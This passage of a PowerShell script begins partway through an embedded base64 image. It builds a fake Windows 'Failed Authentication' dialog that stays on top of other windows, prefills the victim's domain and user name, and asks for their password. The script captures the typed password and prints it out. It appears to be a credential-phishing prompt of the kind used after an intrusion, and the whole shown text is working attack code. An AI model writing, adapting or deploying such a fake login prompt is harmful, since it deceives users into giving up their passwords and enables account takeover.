Ml8tkPDMA0u/dE8gMTMI3WIQsMEzBtg9H2REqPxEJnMp03JseR21lrH8No51Z16IYOznTWwxKG5wRrBazRaDQazRhoj4JWdHCcZk2vgxtj9ugKxzGap9c0fmqv2rfLWnrUvrHjpHZ/dfxzrwyx3vW9YaUNjP6P5Ehj0SfsPVMc0gVI9YPFv3QcA8hkWuO3ucKmcsP33eYIGeqAp/imvuhsZVmj8RJysk5fUb2CTafSTUPYW8knrIqVyRqApfSDGp4TrBWwRqPRaDRjoFsU9JB1sDpF6FUND5ZY1Tgg7du/j3uvPJVPssc2DN05PJd3ko/kYEnTCXjSmJyOUl7kJiVTvFpriu8bgGcCZDPQqofVG5k+4qt9/+6ysZ8K0o0aWIUsYRVo07IBP3FMcYLrUila0cFO3QCyU53zD8MJ1gpYo9FoNJoxEFsLem86WIibEqd6o1pzeJr4Ln2QYr5NVrr9a99eI59H6f4Odtlo/PN4ewBPAun3aMCRzH3EukcZpbetOwGnp6GJfYCpnAHksgCeA6HXq+K6HuAHFmBbrRPONhwgZwNUJjEIukGjXLTT2sRGVHNMN6RGTrDT+pOjOsFZ5Qg0qkPL37IBba1WwBqNRqPRjIFYBSyk18FCshqOusIqyZp4GCSvJY3SnQTtOyjiFMz9Hf+cfi3jyrjtlcmMOr7/3luoTFqOtVR1jrKxFZ1mAJ4rP48LeJhAbaNT5PruxFjfCmp/pFKpDpRKndNjl0080OVyv9uWBq2ANRqNRqMZAw0FnNz1KI0OjhsnzicWkjWx0L8fnObp+y41ZnuMdm5M2ZP27ZVJcH8nOma1R318/2UAT5o+mwTub0WuuVfQClij0Wg0mjHQUMCffWkUK5MsK3fCSgEFbq1jiul1TjHcSvdla6WEkU2n03Lx3XrnyPXuIxj1ndb/ON3XTm2n62Sjtg3RdiAY/g4QON3dEcPZbf2PW+34Nm5PjWC7c0qlcx/xI8vWOsfvMnKtc+RY4o7P5JOJJBuOkui7pX6O5ND68KQi9ZEMcvvuPlMu3znFLHaOM5XtnGJ0H9nIdS6L3Ro/yEx3zp9tVXcKzJmuY8buRS4yf+TIBNmYMbOd22narX30M7Pd16gQ3dPAlrV3nmq+letc1u6cMl5syyLMDx4e/x/gYxLwGnV75wAAAABJRU5ErkJggg==' # Fill this variable with your base64-encoded image string

# Create the form
$form = New-Object System.Windows.Forms.Form
$form.Text = 'Failed Authentication'
$form.Size = New-Object System.Drawing.Size(350, 280)  # Increased the height from 250 to 280
$form.StartPosition = 'CenterScreen'
$form.TopMost = $true

$form.ShowIcon = $false

# Decode the base64 string and create an Image
$imageBytes = [System.Convert]::FromBase64String($base64Image)
$imageStream = New-Object IO.MemoryStream($imageBytes, 0, $imageBytes.Length)
$image = [System.Drawing.Image]::FromStream($imageStream)

# Image banner at the top
$banner = New-Object System.Windows.Forms.PictureBox
$banner.Location = New-Object System.Drawing.Point(0, 0) # Sets the location to the top-left corner
$banner.Size = New-Object System.Drawing.Size($form.Width, 60)
$banner.Image = $image
$banner.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::StretchImage
$form.Controls.Add($banner)


# "Enter your credentials." Label
$credentialsLabel = New-Object System.Windows.Forms.Label
$credentialsLabel.Location = New-Object System.Drawing.Point(10, 65)
$credentialsLabel.Size = New-Object System.Drawing.Size(330,20)
$credentialsLabel.Text = 'Enter your credentials.'
$form.Controls.Add($credentialsLabel)

# Username Label
$userLabel = New-Object System.Windows.Forms.Label
$userLabel.Location = New-Object System.Drawing.Point(10, 90)
$userLabel.Size = New-Object System.Drawing.Size(100,20)
$userLabel.Text = 'User name:'
$form.Controls.Add($userLabel)

# Username Textbox
$userBox = New-Object System.Windows.Forms.TextBox
$userBox.Location = New-Object System.Drawing.Point(10, 110)
$userBox.Size = New-Object System.Drawing.Size(330,20)
$userBox.Text = [Environment]::UserDomainName + '\' + [Environment]::UserName
$form.Controls.Add($userBox)

# Password Label
$passwordLabel = New-Object System.Windows.Forms.Label
$passwordLabel.Location = New-Object System.Drawing.Point(10, 140)
$passwordLabel.Size = New-Object System.Drawing.Size(100,20)
$passwordLabel.Text = 'Password:'
$form.Controls.Add($passwordLabel)

# Password Textbox
$passwordBox = New-Object System.Windows.Forms.TextBox
$passwordBox.Location = New-Object System.Drawing.Point(10, 160)
$passwordBox.Size = New-Object System.Drawing.Size(330,20)
$passwordBox.UseSystemPasswordChar = $true
$form.Controls.Add($passwordBox)

# OK Button
$OKButton = New-Object System.Windows.Forms.Button
$OKButton.Location = New-Object System.Drawing.Point(145, 200)  # Adjusted the position from (165, 220) to (145, 200)
$OKButton.Size = New-Object System.Drawing.Size(75,23)
$OKButton.Text = 'OK'
$OKButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
$form.Controls.Add($OKButton)

$form.AcceptButton = $OKButton

# Cancel Button
$CancelButton = New-Object System.Windows.Forms.Button
$CancelButton.Location = New-Object System.Drawing.Point(235, 200)  # Adjusted the position from (265, 220) to (235, 200)
$CancelButton.Size = New-Object System.Drawing.Size(75,23)
$CancelButton.Text = 'Cancel'
$form.Controls.Add($CancelButton)

$OKButton.Add_Click({
    $form.Tag = $passwordBox.Text
    $form.Close()
})

$CancelButton.Add_Click({
    $form.Close()
})

# Create a timer that will close the form after the timeout
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = $Timeout * 1000
$timer.Add_Tick({
    $form.Close()
    Write-Output "Prompt timed out!"
})
$timer.Start()

# Show the form
$dialogResult = $form.ShowDialog()

# Dispose resources after the form is closed
$image.Dispose()
$imageStream.Dispose()
$timer.Dispose()

# Output the entered password if it was provided
if ($form.Tag) {
    Write-Output "Password entered: $($form.Tag)"
}
